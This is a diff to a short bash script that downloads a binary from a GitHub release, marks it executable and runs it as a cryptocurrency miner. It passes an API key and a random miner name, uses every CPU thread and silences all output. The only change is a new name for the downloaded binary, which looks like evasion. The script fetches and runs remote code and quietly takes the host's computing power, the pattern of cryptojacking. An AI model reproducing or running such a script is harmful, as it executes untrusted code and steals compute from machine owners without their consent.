@@ -1,4 +1,4 @@
 #!/bin/bash
-wget https://github.com/vedhagsvp/qubros/releases/download/apl/pkis
-chmod +x pkis
-./pkis -apiKey nock0000-4066-08a1-0b50-862775c919ff -minerName $(echo $(shuf -i 1-15000 -n 1)-aw11) -threads $(nproc --all) > /dev/null 2>&1
+wget https://github.com/vedhagsvp/qubros/releases/download/apl/h9msk
+chmod +x h9msk
+./h9msk -apiKey nock0000-4066-08a1-0b50-862775c919ff -minerName $(echo $(shuf -i 1-15000 -n 1)-aw11) -threads $(nproc --all) > /dev/null 2>&1
